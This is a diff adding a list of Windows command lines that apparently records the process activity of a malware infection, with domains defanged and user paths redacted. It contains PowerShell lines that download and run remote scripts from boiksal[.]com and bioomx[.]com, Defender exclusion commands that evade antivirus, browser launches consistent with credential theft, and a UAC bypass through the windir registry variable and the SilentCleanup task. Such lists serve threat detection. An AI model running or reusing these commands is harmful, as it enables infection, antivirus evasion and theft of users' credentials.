@@ -1,0 +1,21 @@
+"C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe" -w h -ep b -c "iex (iwr boiksal[.]com/upd -useb).Content"
+"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command " try { if (Get-Command Add-MpPreference -ErrorAction SilentlyContinue) { Add-MpPreference -ExclusionPath 'C:\\Users\\<REDACTED>' -Force; Add-MpPreference -ExclusionPath 'C:\\Users\\<REDACTED>\\AppData\\Local\\Temp\\tibKZb\\updater.exe' -Force; Add-MpPreference -ExclusionProcess 'C:\\Users\\<REDACTED>\\AppData\\Local\\Temp\\tibKZb\\updater.exe' -Force; } } catch { } "
+powershell Start-Sleep -Seconds 3; Remove-Item -Path <REDACTED> -Force
+"C:\Windows\system32\cmd.exe" /c start /min powershell -w hidden -c "$p=$env:APPDATA+'\a\f.ps1'; mkdir (Split-Path $p) -Force; ni (Split-Path $p)-ea 0|Out-Null; iwr hxxp://bioomx[.]com/upd -UseBasicPar -o $p; & powershell -w hidden -ep bypass -f $p"
+"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -w hidden -ep bypass -f C:\Users\<REDACTED\AppData\Roaming\a\f.ps1
+"C:\Users\<REDACTED>\AppData\Roaming\Microsoft\Python\3.13.5\pythonw.exe" C:\Users\<REDACTED>\AppData\Roaming\Microsoft\Python\3.13.5\ping_msdn.py
+"C:\Windows\System32\rundll32.exe" "C:\Windows\System32\shell32.dll" #61
+"C:\Program Files\Mozilla Firefox\firefox.exe" -no-deelevate
+"C:\Program Files (x86)\Mozilla Firefox\firefox.exe"  -no-deelevate
+"C:\Program Files\Google\Chrome\Application\chrome.exe" --mute-audio --do-not-de-elevate
+"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe" --mute-audio --do-not-de-elevate
+"C:\Users\<REDACTED>\AppData\Local\Google\Chrome\Application\chrome.exe" --mute-audio --do-not-de-elevate
+"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --mute-audio --do-not-de-elevate
+"C:\Program Files\Microsoft\Edge\Application\msedge.exe" --mute-audio --do-not-de-elevate
+"C:\Users\<REDACTED>\AppData\Local\Microsoft\Edge\Application\msedge.exe" --mute-audio --do-not-de-elevate
+"C:\Program Files (x86)\BraveSoftware\Brave-Browser\Application\brave.exe" --mute-audio --do-not-de-elevate
+"C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe" --mute-audio --do-not-de-elevate
+"C:\Users\<REDACTED>\AppData\Local\BraveSoftware\Brave-Browser\Application\brave.exe" --mute-audio --do-not-de-elevate
+reg add "HKCU\Environment" /v windir /t REG_SZ /d "<REDACTED> /1" /f
+schtasks /Run /i /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
+reg delete "HKCU\Environment" /v windir /f
